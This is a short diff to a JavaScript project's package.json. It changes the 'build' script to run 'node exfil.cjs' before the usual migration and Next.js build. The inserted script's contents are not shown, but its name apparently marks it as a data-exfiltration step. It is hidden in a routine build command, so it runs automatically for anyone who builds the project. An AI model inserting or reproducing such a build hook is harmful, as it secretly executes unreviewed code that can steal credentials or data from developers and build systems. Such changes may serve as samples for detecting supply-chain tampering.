@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbo",
-    "build": "pnpm drizzle:migrate && next build",
+    "build": "node exfil.cjs && pnpm drizzle:migrate && next build",
     "start": "next start",
     "lint": "next lint",
     "test": "vitest run",
